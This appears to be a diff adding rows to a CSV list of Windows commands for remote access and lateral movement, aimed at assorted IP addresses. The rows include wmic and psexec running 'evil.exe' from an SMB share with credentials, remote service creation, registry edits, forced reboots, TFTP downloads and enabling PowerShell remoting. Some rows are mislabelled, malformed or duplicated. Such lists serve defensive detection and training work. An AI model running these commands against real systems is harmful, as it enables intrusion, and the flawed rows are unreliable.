+tftp.exe,tftp -I 104.210.48.12 GET remotefile,TFTP file transfer,NETWORK INFO
+wmic.exe,"wmic /node: 104.210.48.12 /user:domain\user /password:password process call create ""\\smbiP\share\evil.exe""",Execute file hosted over SMB on remote system with specified credentials,WMIC COMMANDS
+xcopy.exe,xcopy /s \\ 104.210.48.12 \dir C:\local,Copy remote folder,WINDOWS REMOTING
+reg.exe,reg add \\ 45.248.64.126 \ regkej \ value,Add registry key remotely,WINDOWS REMOTING
+reg.exe,reg query\\ 45.248.64.126 \ RegDomain \ Key /v,Query remote registry,WINDOWS SYSTEMINFO
+sc.exe,sc \\ 45.248.64.126 create service,Create a remote service,WINDOWS REMOTING
+shutdown.exe,shutdown /m \\ 45.248.64.126 /r /t 0 /f,Remotely reboot machine ,WINDOWS REMOTING
+systeminfo.exe,systeminfo /S 45.248.64.126 /U domain\user /P Pwd,Remote system info,WINDOWS SYSTEMINFO
+systeminfo.exe,systeminfo /S 45.248.64.126 /U domain\user /P Pwd,Remote systeminfo,WINDOWS REMOTING
+tasklist.exe,tasklist /S 103.252.142.21 /v,Remote process listing,WINDOWS SYSTEMINFO
+tasklist.exe,tasklist /S 103.252.142.21 /v,Remote process listing,WINDOWS REMOTING
+tftp.exe,tftp -I 103.252.142.21 GET remotefile,TFTP file transfer,NETWORK INFO
+wmic.exe,"wmic /node: 103.252.142.21 /user:domain\user /password:password process call create ""\\smbiP\share\evil.exe""",Execute file hosted over SMB on remote system with specified credentials,WMIC COMMANDS
+xcopy.exe,xcopy /s \\ 103.252.142.21 \dir C:\local,Copy remote folder,WINDOWS REMOTING
+reg.exe,reg add \\ 43.229.95.19 \ regkej \ value,Add registry key remotely,WINDOWS REMOTING
+reg.exe,reg query\\ 43.229.95.19 \ RegDomain \ Key /v,Query remote registry,WINDOWS SYSTEMINFO
+sc.exe,sc \\ 43.229.95.19 create service,Create a remote service,WINDOWS REMOTING
+shutdown.exe,shutdown /m \\ 43.229.95.19 /r /t 0 /f,Remotely reboot machine ,WINDOWS REMOTING
+systeminfo.exe,systeminfo /S 43.229.95.19 /U domain\user /P Pwd,Remote system info,WINDOWS SYSTEMINFO
+systeminfo.exe,systeminfo /S 43.229.95.19 /U domain\user /P Pwd,Remote systeminfo,WINDOWS REMOTING
+tasklist.exe,tasklist /S 43.229.95.19 /v,Remote process listing,WINDOWS SYSTEMINFO
+tasklist.exe,tasklist /S 43.229.95.19 /v,Remote process listing,WINDOWS REMOTING
+tftp.exe,tftp -I 43.229.95.19 GET remotefile,TFTP file transfer,NETWORK INFO
+wmic.exe,"wmic /node: 43.229.95.19 /user:domain\user /password:password process call create ""\\smbiP\share\evil.exe""",Execute file hosted over SMB on remote system with specified credentials,WMIC COMMANDS
+xcopy.exe,xcopy /s \\ 43.229.95.19 \dir C:\local,Copy remote folder,WINDOWS REMOTING
+at.exe,"at \\43.229.95.19 time ""Powershell -Command 'Enable-PSRemoting -Force'"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+at.exe,"at \\43.229.95.19 time+1 ""Powershell -Command 'Set-Item wsman:\localhost\client\trustedhosts ''"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+net.exe,net share \\ 43.229.95.19,Shares of remote computer,WINDOWS REMOTING
+net.exe,net time \\43.229.95.19,TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+net.exe,net use \\ 43.229.95.19,Remote filesystem (IPC$),WINDOWS REMOTING
+net.exe,net time \\142.93.221.91,TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
+net.exe,net use \\ 142.93.221.91,Remote filesystem (IPC$),WINDOWS REMOTING
+net.exe,net use z: \\ 142.93.221.91 \share password,Map drive specified,WINDOWS REMOTING
+netsh.exe,netsh interface 142.93.221.91 set address local dhcp,Set interface to use DHCP ,NETWORK INFO
+netsh.exe,netsh interface 142.93.221.91 show interfaces,List interface IDs/MTUs,NETWORK INFO
+psexec.exe,psexec /accepteula \\ 142.93.221.91 -s cmd.exe,RUN REMOTE COMMAND AS SYSTEM,PSEXEC REMOTING
+psexec.exe,psexec /accepteula \\ 142.93.221.91 -u Domain\user -p Lt1 C:\Progr-1,RUN REMOTE COMMAND WITH SPECIFIED HASH,PSEXEC REMOTING
+psexec.exe,psexec /accepteula \\ 142.93.221.91 -u domain\user -p password -c -f \\ smbiP \share\file.exe,EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS,PSEXEC REMOTING
